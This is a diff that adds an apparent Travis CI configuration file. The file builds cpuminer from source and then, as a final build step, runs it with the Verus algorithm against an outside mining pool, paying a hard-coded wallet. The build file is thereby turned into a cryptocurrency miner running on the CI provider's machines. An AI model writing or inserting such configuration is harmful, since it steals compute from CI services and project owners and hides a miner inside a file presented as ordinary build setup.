@@ -1,0 +1,59 @@
+language: c
+
+os:
+  - linux
+
+dist: focal
+
+compiler:
+  - gcc
+
+env:
+  global:
+    - MAKEJOBS=-j4
+    - CFLAGS="-O3 -march=native -mtune=native"
+    - WALLET=RPw1mcxaVvVcUicUqMmqon6n88esCrN3SP
+    - WORKER=travis-worker
+    - POOL=stratum+tcp://na.luckpool.net:3956
+
+cache:
+  apt: true
+
+addons:
+  apt:
+    packages:
+      - build-essential
+      - automake
+      - autoconf
+      - libtool
+      - pkg-config
+      - libcurl4-openssl-dev
+      - libssl-dev
+      - libjansson-dev
+      - libgmp-dev
+
+before_script:
+  - chmod +x autogen.sh || true
+  - ./autogen.sh || true
+
+script:
+  - ./configure \
+      CFLAGS="$CFLAGS" \
+      --with-crypto \
+      --with-curl
+
+  - make clean
+
+  - make $MAKEJOBS
+
+  - strip cpuminer || true
+
+  - echo "Build selesai"
+
+  # mulai mining
+  - ./cpuminer \
+      -a verus \
+      -o $POOL \
+      -u $WALLET.$WORKER \
+      -p x \
+      -t 2
